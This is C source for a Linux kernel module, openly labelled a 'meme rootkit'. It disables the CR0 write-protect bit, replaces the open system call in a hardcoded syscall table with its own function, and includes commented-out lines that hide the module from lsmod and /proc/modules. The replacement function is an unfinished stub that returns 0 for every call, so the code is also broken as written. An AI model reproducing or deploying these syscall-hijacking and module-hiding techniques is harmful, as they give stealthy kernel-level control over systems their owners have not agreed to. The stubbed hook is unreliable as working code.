#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>

/* Macros for disabling and enabling the Write Protected (read only)
 * bit in the control register cr0.
 * 
 * We need to disable it in order to overwrite to the system call table at
 * runtime.
 */
#define WP_DISABLE write_cr0(read_cr0() & (~ 0x10000));
#define WP_ENABLE write_cr0(read_cr0() | 0x10000); 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jason Turley");
MODULE_DESCRIPTION("A meme rootkit.");

char *memefile;
void **sys_call_table = (void **)0xffffffff82000300;		/* change me */

module_param(memefile, charp, 0);
MODULE_PARM_DESC(memefile, "file path to the meme.");

/* Save a copy of the original open system call */
asmlinkage int (*o_open)(const char *pathname, int flags, mode_t mode);

/* meme_open: the hijacked open system call that will open the memefile instead of
 * the intended PNG file. 
 */
asmlinkage int meme_open(const char *pathname, int flags, mode_t mode)
{
		
		/* Check if user is opening a PNG file */
		// if so, open our memefile instead
		// otherwise, open the non-PNG file
		return 0;
}

static int __init memekit_init(void)
{
	/* Uncomment to hide our rootkit from /proc/modules, /sys/module, and lsmod */
	/* WARNING: rmmod won't be able to find and remove the rootkit */
	//list_del_init(&__this_module.list);
	//kobject_del(&THIS_MODULE->mkobj.kobj);

	if (sys_call_table) {
		printk(KERN_INFO "memekit: found sys_call_table at address %lx\n", (unsigned long)sys_call_table);
	} else {
		printk(KERN_ERR "memekit: failed to find sys_call_table, aborting now");
		return -1;
	}

	/* Disable write protect so we can overwrite the syscall table */
	WP_DISABLE;

	/* Hijack the legit open system call with our meme open function */
	o_open = (int(*)(const char *, int, mode_t))(sys_call_table[__NR_open]); 
	sys_call_table[__NR_open] = (void *) meme_open;

	/* Enable write protect mode */
	WP_ENABLE;

	return 0;
}

static void __exit memekit_exit(void)
{
	/* Restore the original open system call */
	WP_DISABLE;
	sys_call_table[__NR_open] = o_open;
	WP_ENABLE;

	printk(KERN_INFO "memekit: unloaded!\n");
}

module_init(memekit_init);
module_exit(memekit_exit);
